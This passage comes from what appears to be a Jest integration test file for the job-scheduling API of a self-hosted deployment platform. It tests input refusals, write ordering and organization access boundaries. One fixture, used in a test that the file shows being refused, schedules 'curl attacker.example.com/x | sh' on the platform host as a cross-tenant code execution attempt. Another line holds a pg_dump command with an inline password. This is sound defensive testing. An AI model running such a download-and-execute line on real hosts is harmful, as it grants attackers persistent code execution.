      // unguarded, `PATCH` would stay the way into the state `POST` now
      // refuses.
      const { ownerCtx, ownerSession, application } = await setUpApplication();
      const created = await createSchedule(
        ownerCtx,
        scheduleInput(application),
      );

      const refused = await request(server)
        .patch(`/schedules/${created.scheduleId}`)
        .set('Cookie', ownerSession.cookie)
        .send({ script: 'PGPASSWORD=hunter2 pg_dump cloudgate' });

      expect(refused.status).toBe(400);
      expect(JSON.stringify(refused.body)).toContain(INERT_SCRIPT_REFUSAL);
      expect(
        (await schedules.findOne(ownerCtx, created.scheduleId)).script,
      ).toBeNull();
    });

    it('clears an inert script a row already holds', async () => {
      // The remediation for a row created before this rule shipped, which gets
      // no backfill: nothing in a guard may refuse the write that fixes what it
      // is refusing.
      const { ownerCtx, ownerSession, application } = await setUpApplication();
      const created = await createSchedule(
        ownerCtx,
        scheduleInput(application),
      );
      await ctx.db.execute(
        sql`UPDATE schedule SET script = 'apt update' WHERE schedule_id = ${created.scheduleId}`,
      );

      const cleared = await request(server)
        .patch(`/schedules/${created.scheduleId}`)
        .set('Cookie', ownerSession.cookie)
        .send({ script: null });

      expect(cleared.status).toBe(200);
      expect(
        (await schedules.findOne(ownerCtx, created.scheduleId)).script,
      ).toBeNull();
    });

    it('keeps taking a script for the two types that run one, and still materializes it', async () => {
      // The other direction, which is what makes the refusal above a
      // classification rather than a ban: the row holds the script and the
      // host receives it, unchanged.
      const { ownerCtx } = await setUpApplication();
      const key = await sshKeys.create(ownerCtx, { name: 'server-key' });
      const remote = await servers.create(ownerCtx, {
        name: 'worker-1',
        ipAddress: '203.0.113.10',
        port: 22,
        username: 'root',
        sshKeyId: key.sshKeyId,
      });
      execMock.execAsyncRemote.mockClear();

      const onServer = await createSchedule(ownerCtx, {
        name: 'Update packages',
        cronExpression: '0 6 * * *',
        scheduleType: 'server',
        serviceId: remote.serverId,
        command: '',
        script: 'apt update',
      });
      expect(onServer.script).toBe('apt update');
      const [, materialization] = execMock.execAsyncRemote.mock.calls[0] as [
        string,
        string,
      ];
      expect(decodeMaterializedScript(materialization)).toContain('apt update');

      execMock.execAsync.mockClear();
      const onHost = await createSchedule(ownerCtx, {
        name: 'Host cleanup',
        cronExpression: '0 4 * * *',
        scheduleType: 'cloudgate-server',
        command: '',
        script: 'docker system prune -f',
      });
      expect(onHost.script).toBe('docker system prune -f');
      const [hostMaterialization] = execMock.execAsync.mock.calls[0] as [
        string,
      ];
      expect(decodeMaterializedScript(hostMaterialization)).toContain(
        'docker system prune -f',
      );
    });
  });

  /**
   * The mirror of the block above and over the same two paths.
   *
   * `buildRunScript` never reads `command` for `server` or `cloudgate-server`
   * — those two run the `script.sh` they materialized — so a `command` on one
   * of them was stored and never executed. The earlier fix declined to refuse it because
   * the DTO's `.default('')` manufactured one for every request; the default is
   * gone and the `''` is minted in `SchedulesService.create` instead, behind
   * the refusal. The DTO's unit half, including why `''` is admitted where
   * `script`'s rule refuses even an empty value, is
   * `schedule-inert-command.spec.ts`; what is pinned here is the HTTP status
   * and the `PATCH` half no schema can state.
   */
  describe('a command a schedule type cannot run', () => {
    async function setUpServer() {
      const context = await setUpApplication();
      const key = await sshKeys.create(context.ownerCtx, {
        name: 'server-key',
      });
      const remote = await servers.create(context.ownerCtx, {
        name: 'worker-1',
        ipAddress: '203.0.113.10',
        port: 22,
        username: 'root',
        sshKeyId: key.sshKeyId,
      });
      return { ...context, remote };
    }

    it('refuses it on create, naming the field and the remedy', async () => {
      const { ownerSession, remote } = await setUpServer();

      const refused = await request(server)
        .post('/schedules')
        .set('Cookie', ownerSession.cookie)
        .send({
          name: 'Nightly dump',
          cronExpression: '0 6 * * *',
          scheduleType: 'server',
          serviceId: remote.serverId,
          command: 'PGPASSWORD=hunter2 pg_dump cloudgate',
          script: 'apt update',
        });

      expect(refused.status).toBe(400);
      expect(JSON.stringify(refused.body)).toContain(INERT_COMMAND_REFUSAL);

      // Nothing was written, and nothing was written on the Server either: the
      // refusal is at the DTO, in front of both the materialization and the
      // insert (the atomic-write ordering).
      const rows = await ctx.db.execute(sql`SELECT count(*) FROM schedule`);
      expect((rows.rows[0] as { count: string }).count).toBe('0');
    });

    it('takes a host schedule that sends no command at all, and stores the empty one', async () => {
      // The property the removed `.default('')` used to hide. Absent means
      // absent at the DTO, and the column's `''` is minted in `create` — so the
      // row is byte-identical to what a client sending `command: ''` gets.
      const { ownerSession, remote } = await setUpServer();

      const created = await request(server)
        .post('/schedules')
        .set('Cookie', ownerSession.cookie)
        .send({
          name: 'Update packages',
          cronExpression: '0 6 * * *',
          scheduleType: 'server',
          serviceId: remote.serverId,
          script: 'apt update',
        });

      expect(created.status).toBe(201);
      expect((created.body as { command: string }).command).toBe('');
    });

    it('refuses it on update against the stored type, which the body cannot name', async () => {
      // `updateScheduleSchema` carries no `scheduleType`, so this is the branch
      // the DTO structurally cannot decide — the reason
      // `SchedulesService.refuseInertCommand` exists. Left unguarded, `PATCH`
      // would stay the way into the state `POST` now refuses.
      const { ownerCtx, ownerSession, remote } = await setUpServer();
      const created = await createSchedule(ownerCtx, {
        name: 'Update packages',
        cronExpression: '0 6 * * *',
        scheduleType: 'server',
        serviceId: remote.serverId,
        script: 'apt update',
      });

      const refused = await request(server)
        .patch(`/schedules/${created.scheduleId}`)
        .set('Cookie', ownerSession.cookie)
        .send({ command: 'PGPASSWORD=hunter2 pg_dump cloudgate' });

      expect(refused.status).toBe(400);
      expect(JSON.stringify(refused.body)).toContain(INERT_COMMAND_REFUSAL);
      expect(
        (await schedules.findOne(ownerCtx, created.scheduleId)).command,
      ).toBe('');
    });

    it('clears an inert command a row already holds', async () => {
      // The remediation for a row created before this rule shipped, which gets
      // no backfill: nothing in a guard may refuse the write that fixes what it
      // is refusing. `''` rather than `null` because the column is `notNull`.
      const { ownerCtx, ownerSession, remote } = await setUpServer();
      const created = await createSchedule(ownerCtx, {
        name: 'Update packages',
        cronExpression: '0 6 * * *',
        scheduleType: 'server',
        serviceId: remote.serverId,
        script: 'apt update',
      });
      await ctx.db
        .update(schedule)
        .set({ command: 'pg_dump cloudgate' })
        .where(eq(schedule.scheduleId, created.scheduleId));

      const cleared = await request(server)
        .patch(`/schedules/${created.scheduleId}`)
        .set('Cookie', ownerSession.cookie)
        .send({ command: '' });

      expect(cleared.status).toBe(200);
      expect(
        (await schedules.findOne(ownerCtx, created.scheduleId)).command,
      ).toBe('');
    });

    it('keeps taking a command for the two types that run one, and still execs it', async () => {
      // The other direction, which is what makes the refusal a classification
      // rather than a ban.
      const { ownerCtx, application } = await setUpApplication();
      execMock.execAsync.mockClear();

      const created = await createSchedule(ownerCtx, {
        name: 'Clear cache',
        cronExpression: '0 3 * * *',
        scheduleType: 'application',
        serviceId: application.applicationId,
        command: 'rm -rf /tmp/cache',
      });
      expect(created.command).toBe('rm -rf /tmp/cache');

      await schedules.runManual(ownerCtx, created.scheduleId);
      const [, options] = execMock.execAsync.mock.calls.at(-1) as [
        string,
        { env?: Record<string, string> },
      ];
      // The command travels in the environment rather than as a word of
      // the program, so this is where it has to be found.
      expect(Object.values(options?.env ?? {})).toContain('rm -rf /tmp/cache');
    });
  });

  // Create inserted the row and *then* wrote script.sh on the target,
  // so a host that could not take the script answered 500 and kept the
  // schedule. Everything that can fail now happens before the one statement
  // that persists anything.
  describe('a create that cannot reach its target', () => {
    async function setUpServerTarget() {
      const context = await setUpApplication();
      const key = await sshKeys.create(context.ownerCtx, {
        name: 'server-key',
      });
      const remote = await servers.create(context.ownerCtx, {
        name: 'worker-1',
        ipAddress: '203.0.113.10',
        port: 22,
        username: 'root',
        sshKeyId: key.sshKeyId,
      });
      return { ...context, remote };
    }

    const serverScheduleInput = (remote: { serverId: string }) => ({
      name: 'Update packages',
      cronExpression: '0 6 * * *',
      scheduleType: 'server' as const,
      serviceId: remote.serverId,
      command: '',
      script: 'apt update',
    });

    it('leaves no schedule row when the script cannot be written on the Server', async () => {
      const { ownerCtx, remote } = await setUpServerTarget();
      // The reported failure: ssh2 throws inside .connect(), so nothing at all
      // was written on the target.
      execMock.execAsyncRemote.mockRejectedValueOnce(
        new Error('Cannot parse privateKey: Malformed OpenSSH private key'),
      );

      await expect(
        createSchedule(ownerCtx, serverScheduleInput(remote)),
      ).rejects.toThrow('Malformed OpenSSH private key');

      // Nothing was written on the way to being refused.
      expect(await ctx.db.select().from(schedule)).toHaveLength(0);
      expect(scheduling.ids().length).toBe(0);
    });

    it('materializes the script before the row exists', async () => {
      const { ownerCtx, remote } = await setUpServerTarget();

      // Read the table from inside the exec, which is the only moment the
      // ordering is observable: an insert-then-write create passes every
      // after-the-fact assertion this file makes.
      let rowsDuringWrite: unknown[] | undefined;
      let commandDuringWrite: string | undefined;
      execMock.execAsyncRemote.mockImplementationOnce(
        async (_serverId: string, command: string) => {
          rowsDuringWrite = await ctx.db.select().from(schedule);
          commandDuringWrite = command;
          return { stdout: '', stderr: '', exitCode: 0 };
        },
      );

      const created = await createSchedule(
        ownerCtx,
        serverScheduleInput(remote),
      );

      expect(rowsDuringWrite).toHaveLength(0);
      // The scheduleId and appName the script names are the ones that landed:
      // both are minted in the service now, not by the column defaults.
      expect(commandDuringWrite).toContain(
        `/etc/cloudgate/schedules/${created.appName}/script.sh`,
      );
      expect(decodeMaterializedScript(commandDuringWrite!)).toContain(
        `Schedule ID: ${created.scheduleId}`,
      );
      expect(await ctx.db.select().from(schedule)).toHaveLength(1);
    });

    it('leaves the stored script unchanged when the target refuses the write', async () => {
      const { ownerCtx, remote } = await setUpServerTarget();
      const created = await createSchedule(
        ownerCtx,
        serverScheduleInput(remote),
      );

      execMock.execAsyncRemote.mockRejectedValueOnce(
        new Error('connect ETIMEDOUT 203.0.113.10:22'),
      );
      await expect(
        schedules.update(ownerCtx, created.scheduleId, {
          script: 'apt update && reboot',
        }),
      ).rejects.toThrow('ETIMEDOUT');

      const [row] = await ctx.db
        .select()
        .from(schedule)
        .where(eq(schedule.scheduleId, created.scheduleId));
      // The row and the target still agree on what script.sh contains.
      expect(row.script).toBe('apt update');
    });
  });

  describe('cloudgate-server schedules', () => {
    it('scopes the schedule to the active organization and materializes locally', async () => {
      const { organizationId, ownerCtx } = await setUpApplication();

      const created = await createSchedule(ownerCtx, {
        name: 'Host cleanup',
        cronExpression: '0 4 * * *',
        scheduleType: 'cloudgate-server',
        command: '',
        script: 'docker system prune -f',
      });
      expect(created.organizationId).toBe(organizationId);
      expect(created.serverId).toBeNull();

      // The cloudgate host materializes its script with local exec.
      const [command] = execMock.execAsync.mock.calls[0] as [string];
      expect(command).toContain(
        `mkdir -p ${platformHostRoot()}/schedules/${created.appName}`,
      );
      expect(decodeMaterializedScript(command)).toBe(
        `echo "PID: $$ | Schedule ID: ${created.scheduleId}"\ndocker system prune -f`,
      );

      // Listing host schedules needs no service id — the org scopes it.
      const listed = await schedules.list(ownerCtx, {
        scheduleType: 'cloudgate-server',
      });
      expect(listed.map((row) => row.scheduleId)).toEqual([created.scheduleId]);
    });

    it('hides host schedules from other organizations', async () => {
      const { ownerSession, ownerCtx } = await setUpApplication();
      const created = await createSchedule(ownerCtx, {
        name: 'Host cleanup',
        cronExpression: '0 4 * * *',
        scheduleType: 'cloudgate-server',
        command: '',
        script: 'docker system prune -f',
      });

      const secondOrg = await createOrganization(
        server,
        ctx.db,
        ownerSession.cookie,
        { name: 'Second Org' },
      );
      const secondOrgCtx = permissionCtx(
        ownerSession.id,
        (secondOrg.body as { id: string }).id,
      );

      await expect(
        schedules.findOne(secondOrgCtx, created.scheduleId),
      ).rejects.toThrow(NotFoundException);
      const listed = await schedules.list(secondOrgCtx, {
        scheduleType: 'cloudgate-server',
      });
      expect(listed).toHaveLength(0);
    });
  });

  /**
   * H-63. `scheduleType: 'cloudgate-server'` hard-codes `serverId: null`, which
   * is the platform host — the machine Cloudgate itself runs on — and
   * `checkAccess` asked only for the `schedule` statement and the caller's
   * owner/admin role *in whichever organization they were acting in*. So an
   * owner of a second Organization, never a Member of the first, could write
   * `script.sh` under `{CLOUDGATE_DIRECTORY}/schedules/` on that host and have
   * cron run it as the backend process user, on a schedule of their choosing.
   * That is persistent arbitrary code execution on the instance, reached with
   * the lowest-privilege account the product can mint a second of.
   *
   * The neighbouring suite denied a plain Member and hid one organization's rows
   * from another. Neither asks this, because a row that is invisible is not the
   * same as a host that is unreachable: nothing here needs an existing row.
   *
   * Every verb takes the same boundary, not only the writing ones. `list` and
   * `findOne` are already scoped to the caller's own `organizationId`, so
   * admitting the read discloses nothing — but the *target* does not change with
   * the verb, and a caller who may not address the platform host may not address
   * it to ask what is on it either (ADR-0013's first consequence).
   */
  describe('the platform host as a schedule target', () => {
    const hostSchedule = {
      name: 'Host cleanup',
      cronExpression: '0 4 * * *',
      scheduleType: 'cloudgate-server' as const,
      command: '',
      script: 'curl attacker.example.com/x | sh',
    };

    it("refuses another organization's owner a schedule on the platform host", async () => {
      const ownerSession = await signUp(server, owner);
      const mallory = await secondOrganizationOwner(
        server,
        ctx.db,
        ownerSession.cookie,
      );

      const denied = await request(server)
        .post('/schedules')
        .set('Cookie', mallory.cookie)
        .send(hostSchedule);
      expect(denied.status).toBe(403);
      expect((denied.body as { message: string }).message).toBe(
        INSTANCE_AUTHORITY_REFUSAL,
      );

      // Nothing was written to the host on the way to being refused, and no
      // row was left behind for a cron tick to find.
      expect(execMock.execAsync).not.toHaveBeenCalled();
      const rows = await ctx.db.select().from(schedule);
      expect(rows).toHaveLength(0);
    });

    it("refuses another organization's owner even the read of the host's schedules", async () => {
      const ownerSession = await signUp(server, owner);
      const mallory = await secondOrganizationOwner(
        server,
        ctx.db,
        ownerSession.cookie,
      );

      const denied = await request(server)
        .get('/schedules')
        .query({ scheduleType: 'cloudgate-server' })
        .set('Cookie', mallory.cookie);
      expect(denied.status).toBe(403);
      expect((denied.body as { message: string }).message).toBe(
        INSTANCE_AUTHORITY_REFUSAL,
      );
    });

    it('lets the instance owner schedule work on the platform host', async () => {
      const ownerSession = await signUp(server, owner);
      await secondOrganizationOwner(server, ctx.db, ownerSession.cookie);

      const created = await request(server)
        .post('/schedules')
        .set('Cookie', ownerSession.cookie)
        .send(hostSchedule);
      expect(created.status).toBe(201);
      expect((created.body as { serverId: string | null }).serverId).toBeNull();

      const { appName } = created.body as { appName: string };
      const [command] = execMock.execAsync.mock.calls[0] as [string];
      expect(command).toContain(
        `mkdir -p ${platformHostRoot()}/schedules/${appName}`,
      );
    });

    /**
     * The no-op claim, asserted rather than assumed: on the single-organization
     * install `deploy/install.sh` produces, the one Organization *is* the
     * instance organization, so the owner and an admin they invited keep the
     * host schedules they had.
     */
    it("leaves the single-organization install's owner and admin exactly as they were", async () => {
      const ownerSession = await signUp(server, owner);
      const admin = await inviteUser(
        server,
        ownerSession.cookie,
        'ada@example.com',
        'admin',
      );

      const byOwner = await request(server)
        .post('/schedules')
        .set('Cookie', ownerSession.cookie)
        .send({ ...hostSchedule, script: 'docker system prune -f' });
      expect(byOwner.status).toBe(201);

      const byAdmin = await request(server)
        .post('/schedules')
        .set('Cookie', admin.cookie)
        .send({ ...hostSchedule, name: 'Admin cleanup' });
      expect(byAdmin.status).toBe(201);

      const listed = await request(server)
        .get('/schedules')
        .query({ scheduleType: 'cloudgate-server' })
        .set('Cookie', admin.cookie);
      expect(listed.status).toBe(200);
      expect(listed.body).toHaveLength(2);
    });
  });

  describe('cron registration', () => {
    it('keeps the cron job in sync across create, update and remove, defaulting to UTC', async () => {
      const { ownerCtx, application } = await setUpApplication();

      const created = await createSchedule(ownerCtx, {
        ...scheduleInput(application),
        timezone: 'Europe/Berlin',
      });
      expect(scheduling.has(created.scheduleId)).toBe(true);
      const job = scheduling.get(created.scheduleId)!;
      expect(job.cronExpression).toBe('0 3 * * *');
      expect(job.timezone).toBe('Europe/Berlin');

      // A schedule with no timezone runs in UTC.
      const defaulted = await createSchedule(
        ownerCtx,
        scheduleInput(application),
      );
      expect(scheduling.get(defaulted.scheduleId)!.timezone).toBe('UTC');

      await schedules.update(ownerCtx, created.scheduleId, {
        cronExpression: '0 5 * * *',
      });
      expect(scheduling.get(created.scheduleId)!.cronExpression).toBe(
        '0 5 * * *',
      );

      await schedules.update(ownerCtx, created.scheduleId, {
        enabled: false,
      });
      expect(scheduling.has(created.scheduleId)).toBe(false);

      await schedules.remove(ownerCtx, defaulted.scheduleId);
      expect(scheduling.has(defaulted.scheduleId)).toBe(false);
    });

    it('a disabled schedule is not registered at create', async () => {
      const { ownerCtx, application } = await setUpApplication();
      const created = await createSchedule(ownerCtx, {
        ...scheduleInput(application),
        enabled: false,
      });
      expect(scheduling.has(created.scheduleId)).toBe(false);
    });

    it('initializeJobs registers every enabled schedule on boot', async () => {
      const { ownerCtx, application } = await setUpApplication();
      const enabled = await createSchedule(
        ownerCtx,
        scheduleInput(application),
      );
      const disabled = await createSchedule(ownerCtx, {
        ...scheduleInput(application),
        enabled: false,
      });

      // Simulate a fresh process: rows exist, no jobs registered yet.
      for (const id of scheduling.ids()) {
        scheduling.unregister(id);
      }

      await schedules.initializeJobs();

      expect(scheduling.has(enabled.scheduleId)).toBe(true);
      expect(scheduling.has(disabled.scheduleId)).toBe(false);
    });
  });

  describe('runs', () => {
    /** Polls until the schedule has a finished run recorded. */
    async function waitForRun(scheduleId: string, status: 'done' | 'error') {
      const deadline = Date.now() + 10_000;
      for (;;) {
        const result = await ctx.db.execute(
          sql`SELECT status FROM deployment WHERE schedule_id = ${scheduleId} AND status = ${status}`,
        );
        if (result.rows.length > 0) return result.rows;
        if (Date.now() > deadline) throw new Error('waitForRun timed out');
        await new Promise((resolve) => setTimeout(resolve, 25));
      }
    }

    it('runs an application schedule in the service container and records the run', async () => {
      const { ownerCtx, application } = await setUpApplication();
      const created = await createSchedule(
        ownerCtx,
        scheduleInput(application),
      );
      execMock.execAsync.mockClear();

      await schedules.runManual(ownerCtx, created.scheduleId);

      // First exec initializes the run's log file under the row's appName.
      const [initCommand] = execMock.execAsync.mock.calls[0] as [string];
      expect(initCommand).toContain(
        `mkdir -p ${platformHostRoot()}/logs/${created.appName}`,
      );

      // A container schedule's run: find the service container, docker exec
      // the command with the row's shell, log every step into the
      // deployment's log file.
      //
      // The `--filter` value is one `quote()`d word rather than a `"…"` one
      // (H-35): `getComposeContainerCommand`'s twin interpolates a schedule's
      // `serviceName`, which is a bare `z.string()` in `schedule.dto.ts`, and
      // double quotes never stopped a `$(…)`. `main-app` is safe, so the escaped
      // spelling is the same argv `"label=…"` produced.
      const [script] = execMock.execAsync.mock.calls[1] as [string];
      expect(script).toContain(
        'CONTAINER_ID=$(docker ps -q --filter "status=running" --filter label\\=com.docker.swarm.service.name\\=main-app | head -n 1)',
      );
      // The command is a holder reference rather than a word of the program
      //: it travels in `ExecOptions.env`, so a failed run cannot
      // journal it. `local` because an Application with no `serverId` runs on
      // the Cloudgate host, which is the branch that has to spread
      // `process.env` or lose `PATH`.
      expect(script).toContain(
        `docker exec $CONTAINER_ID bash -c "$CG_SCHEDULE_COMMAND" >> ${platformHostRoot()}/logs/${created.appName}/`,
      );
      expect(script).not.toContain('rm -rf /tmp/cache');
      const [, options] = execMock.execAsync.mock.calls[1] as [
        string,
        { env: Record<string, string> },
      ];
      expect(options.env.CG_SCHEDULE_COMMAND).toBe('rm -rf /tmp/cache');
      expect(options.env.PATH).toBe(process.env.PATH);
      expect(script).toContain('❌ Command failed');
      expect(script).toContain('✅ Command executed successfully');

      const recorded = await ctx.db.execute(
        sql`SELECT title, status FROM deployment WHERE schedule_id = ${created.scheduleId}`,
      );
      expect(recorded.rows).toHaveLength(1);
      expect(recorded.rows[0]).toMatchObject({
        title: 'Schedule',
        status: 'done',
      });
    });

    it('records a failed run as an error deployment and rethrows', async () => {
      const { ownerCtx, application } = await setUpApplication();
      const created = await createSchedule(
        ownerCtx,
        scheduleInput(application),
      );

      execMock.execAsync
        .mockReset()
        // Log-file initialization succeeds…
        .mockResolvedValueOnce({ stdout: '', stderr: '', exitCode: 0 })
        // …the command itself fails.
        .mockRejectedValueOnce(new Error('container not found'));

      await expect(
        schedules.runManual(ownerCtx, created.scheduleId),
      ).rejects.toThrow('container not found');

      const recorded = await ctx.db.execute(
        sql`SELECT status FROM deployment WHERE schedule_id = ${created.scheduleId}`,
      );
      expect(recorded.rows).toHaveLength(1);
      expect(recorded.rows[0]).toMatchObject({ status: 'error' });
    });

    it('runs a compose schedule against the stack service container', async () => {
      const { ownerCtx, environment } = await setUpApplication();
      const stack = await compose.create(ownerCtx, {
        name: 'Shop Stack',
        appName: 'shop-stack',
        environmentId: environment.environmentId,
        composeType: 'stack',
      });
      const created = await createSchedule(ownerCtx, {
        name: 'Prune stack tmp',
        cronExpression: '0 3 * * *',
        scheduleType: 'compose',
        serviceId: stack.composeId,
        serviceName: 'web',
        shellType: 'sh',
        command: 'rm -rf /tmp/cache',
      });
      execMock.execAsync.mockClear();

      await schedules.runManual(ownerCtx, created.scheduleId);

      const [script] = execMock.execAsync.mock.calls[1] as [string];
      expect(script).toContain(
        'CONTAINER_ID=$(docker ps -q --filter "status=running" --filter label\\=com.docker.stack.namespace\\=shop-stack --filter label\\=com.docker.swarm.service.name\\=shop-stack_web | head -n 1)',
      );
      expect(script).toContain(
        'docker exec $CONTAINER_ID sh -c "$CG_SCHEDULE_COMMAND"',
      );
      expect(script).not.toContain('rm -rf /tmp/cache');
    });

    it('runs a server schedule through its materialized script.sh', async () => {
      const { ownerCtx } = await setUpApplication();
      const key = await sshKeys.create(ownerCtx, { name: 'server-key' });
      const remote = await servers.create(ownerCtx, {
        name: 'worker-1',
        ipAddress: '203.0.113.10',
        port: 22,
        username: 'root',
        sshKeyId: key.sshKeyId,
      });
      const created = await createSchedule(ownerCtx, {
        name: 'Update packages',
        cronExpression: '0 6 * * *',
        scheduleType: 'server',
        serviceId: remote.serverId,
        command: '',
        script: 'apt update',
      });
      execMock.execAsyncRemote.mockClear();

      await schedules.runManual(ownerCtx, created.scheduleId);

      // Both the log-file init and the script run land on the remote server.
      const calls = execMock.execAsyncRemote.mock.calls as [string, string][];
      expect(calls[0][0]).toBe(remote.serverId);
      expect(calls[1][0]).toBe(remote.serverId);
      // A server schedule's wrapper: run script.sh, tee into the log.
      expect(calls[1][1]).toContain(
        `bash -c /etc/cloudgate/schedules/${created.appName}/script.sh 2>&1 | tee -a /etc/cloudgate/logs/${created.appName}/`,
      );
      expect(calls[1][1]).toContain('✅ Command executed successfully');
    });

    it('runs a cloudgate-server schedule locally', async () => {
      const { ownerCtx } = await setUpApplication();
      const created = await createSchedule(ownerCtx, {
        name: 'Host cleanup',
        cronExpression: '0 4 * * *',
        scheduleType: 'cloudgate-server',
        command: '',
        script: 'docker system prune -f',
      });
      execMock.execAsync.mockClear();

      await schedules.runManual(ownerCtx, created.scheduleId);

      const [script] = execMock.execAsync.mock.calls[1] as [string];
      expect(script).toContain(
        `bash -c ${platformHostRoot()}/schedules/${created.appName}/script.sh`,
      );
    });

    it('a fired cron job runs the schedule with no user session', async () => {
      const { ownerCtx, application } = await setUpApplication();
      const created = await createSchedule(
        ownerCtx,
        scheduleInput(application),
      );
      execMock.execAsync.mockClear();

      void scheduling.runNow(created.scheduleId);
      const recorded = await waitForRun(created.scheduleId, 'done');
      expect(recorded).toHaveLength(1);

      const [script] = execMock.execAsync.mock.calls[1] as [string];
      expect(script).toContain('bash -c "$CG_SCHEDULE_COMMAND"');
      expect(script).not.toContain('rm -rf /tmp/cache');
    });

    it("a fired cron job of a Frozen Organization's Service runs nothing and records no run", async () => {
      const { organizationId, ownerCtx, application } =
        await setUpApplication();
      const created = await createSchedule(
        ownerCtx,
        scheduleInput(application),
      );
      await freezeOrganization(ctx, organizationId);
      execMock.execAsync.mockClear();

      await scheduling.runNow(created.scheduleId);

      expect(execMock.execAsync).not.toHaveBeenCalled();
      expect(execMock.execAsyncRemote).not.toHaveBeenCalled();
      const runs = await ctx.db.execute(
        sql`SELECT status FROM deployment WHERE schedule_id = ${created.scheduleId}`,
      );
      expect(runs.rows).toEqual([]);
      jest.restoreAllMocks();
    });

    it('denies a member without row access to the owning service', async () => {
      const { organizationId, ownerSession, ownerCtx, application } =
        await setUpApplication();
      const created = await createSchedule(
        ownerCtx,
        scheduleInput(application),
      );
      const member = await inviteUser(
        server,
        ownerSession.cookie,
        'ida@example.com',
        'member',
      );
      const memberCtx = permissionCtx(member.id, organizationId);

      await expect(
        schedules.runManual(memberCtx, created.scheduleId),
      ).rejects.toThrow(ForbiddenException);
    });
  });

  describe('HTTP surface', () => {
    it('creates, reads, lists, runs, updates and deletes a schedule through the controller', async () => {
      const { ownerSession, application } = await setUpApplication();

      const invalid = await request(server)
        .post('/schedules')
        .set('Cookie', ownerSession.cookie)
        .send({ name: 'Clear cache' });
      expect(invalid.status).toBe(400);

      const created = await request(server)
        .post('/schedules')
        .set('Cookie', ownerSession.cookie)
        .send({
          name: 'Clear cache',
          cronExpression: '0 3 * * *',
          scheduleType: 'application',
          serviceId: application.applicationId,
          command: 'rm -rf /tmp/cache',
        });
      expect(created.status).toBe(201);
      const { scheduleId } = created.body as { scheduleId: string };

      const found = await request(server)
        .get(`/schedules/${scheduleId}`)
        .set('Cookie', ownerSession.cookie);
      expect(found.status).toBe(200);
      expect(found.body).toMatchObject({
        name: 'Clear cache',
        cronExpression: '0 3 * * *',
      });

      const listed = await request(server)
        .get('/schedules')
        .query({
          scheduleType: 'application',
          serviceId: application.applicationId,
        })
        .set('Cookie', ownerSession.cookie);
      expect(listed.status).toBe(200);
      expect(listed.body).toHaveLength(1);

      const ran = await request(server)
        .post(`/schedules/${scheduleId}/run`)
        .set('Cookie', ownerSession.cookie);
      expect(ran.status).toBe(204);

      const updated = await request(server)
        .patch(`/schedules/${scheduleId}`)
        .set('Cookie', ownerSession.cookie)
        .send({ cronExpression: '0 5 * * *' });
      expect(updated.status).toBe(200);
      expect((updated.body as { cronExpression: string }).cronExpression).toBe(
        '0 5 * * *',
      );

      const removed = await request(server)
        .delete(`/schedules/${scheduleId}`)
        .set('Cookie', ownerSession.cookie);
      expect(removed.status).toBe(200);

      const gone = await request(server)
        .get(`/schedules/${scheduleId}`)
        .set('Cookie', ownerSession.cookie);
      expect(gone.status).toBe(404);
    });

    // cronExpression and timezone reach `new CronJob` in
    // SchedulingService.register, which throws synchronously on either — and
    // that throw used to land in syncJob *after* the row was inserted, so a
    // typo answered 500 and kept the schedule. It is a validation failure, so
    // it is answered where the repo answers validation failures.
    it('refuses a cron expression and a timezone the scheduler cannot parse, writing nothing', async () => {
      const { ownerSession, application } = await setUpApplication();
      const body = {
        name: 'Clear cache',
        scheduleType: 'application',
        serviceId: application.applicationId,
        command: 'rm -rf /tmp/cache',
      };

      const badCron = await request(server)
        .post('/schedules')
        .set('Cookie', ownerSession.cookie)
        .send({ ...body, cronExpression: 'not a cron' });
      expect(badCron.status).toBe(400);

      const badZone = await request(server)
        .post('/schedules')
        .set('Cookie', ownerSession.cookie)
        .send({ ...body, cronExpression: '0 3 * * *', timezone: 'Not/AZone' });
      expect(badZone.status).toBe(400);

      // No Server is involved in either: the row is the whole defect.
      expect(await ctx.db.select().from(schedule)).toHaveLength(0);

      // And the same two are refused on the update shape.
      const created = await request(server)
        .post('/schedules')
        .set('Cookie', ownerSession.cookie)
        .send({ ...body, cronExpression: '0 3 * * *' });
      expect(created.status).toBe(201);
      const { scheduleId } = created.body as { scheduleId: string };

      const patched = await request(server)
        .patch(`/schedules/${scheduleId}`)
        .set('Cookie', ownerSession.cookie)
        .send({ cronExpression: '0 0 32 * *' });
      expect(patched.status).toBe(400);
      const [row] = await ctx.db.select().from(schedule);
      expect(row.cronExpression).toBe('0 3 * * *');
    });
  });

  describe('row-level access', () => {
    it('denies a member without row access to the owning service', async () => {
      const { organizationId, ownerSession, ownerCtx, application } =
        await setUpApplication();
      const member = await inviteUser(
        server,
        ownerSession.cookie,
        'ida@example.com',
        'member',
      );
      const memberCtx = permissionCtx(member.id, organizationId);

      await expect(
        createSchedule(memberCtx, scheduleInput(application)),
      ).rejects.toThrow(ForbiddenException);

      const created = await createSchedule(
        ownerCtx,
        scheduleInput(application),
      );
      await expect(
        schedules.findOne(memberCtx, created.scheduleId),
      ).rejects.toThrow(ForbiddenException);
      await expect(
        schedules.list(memberCtx, {
          scheduleType: 'application',
          serviceId: application.applicationId,
        }),
      ).rejects.toThrow(ForbiddenException);
      await expect(
        schedules.update(memberCtx, created.scheduleId, {
          cronExpression: '0 5 * * *',
        }),
      ).rejects.toThrow(ForbiddenException);
      await expect(
        schedules.remove(memberCtx, created.scheduleId),
      ).rejects.toThrow(ForbiddenException);
    });

    it('hides schedules and their services from other organizations', async () => {
      const { ownerSession, ownerCtx, application } = await setUpApplication();
      const created = await createSchedule(
        ownerCtx,
        scheduleInput(application),
      );

      const secondOrg = await createOrganization(
        server,
        ctx.db,
        ownerSession.cookie,
        { name: 'Second Org' },
      );
      const secondOrgCtx = permissionCtx(
        ownerSession.id,
        (secondOrg.body as { id: string }).id,
      );

      await expect(
        schedules.findOne(secondOrgCtx, created.scheduleId),
      ).rejects.toThrow(NotFoundException);
      await expect(
        schedules.update(secondOrgCtx, created.scheduleId, {
          cronExpression: '0 5 * * *',
        }),
      ).rejects.toThrow(NotFoundException);
      await expect(
        schedules.remove(secondOrgCtx, created.scheduleId),
      ).rejects.toThrow(NotFoundException);
    });
  });
});
